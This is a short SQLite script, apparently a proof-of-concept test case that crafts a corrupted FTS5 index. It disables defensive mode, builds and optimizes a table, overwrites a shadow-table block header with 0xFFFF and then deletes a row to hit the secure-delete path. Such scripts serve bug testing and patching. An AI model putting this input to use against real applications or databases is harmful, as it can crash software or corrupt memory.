.dbconfig defensive off
PRAGMA page_size=4096;
CREATE VIRTUAL TABLE t USING fts5(x, detail=none);
WITH s(i) AS (VALUES(1) UNION ALL SELECT i+1 FROM s WHERE i<5000)
INSERT INTO t(rowid, x) SELECT i, 'vulnerabilitytest' FROM s;
INSERT INTO t(t) VALUES('optimize');
INSERT INTO t(t, rank) VALUES('secure-delete', 1);
UPDATE t_data SET block = x'FFFF' || substr(block, 3) WHERE rowid = (
  SELECT rowid FROM t_data
  WHERE rowid>=10 AND length(block)>=4 AND (rowid & 0x7FFFFFFF)>=2
    AND hex(substr(block,1,2))<>'0000'
  ORDER BY rowid LIMIT 1);
DELETE FROM t WHERE rowid=4500;
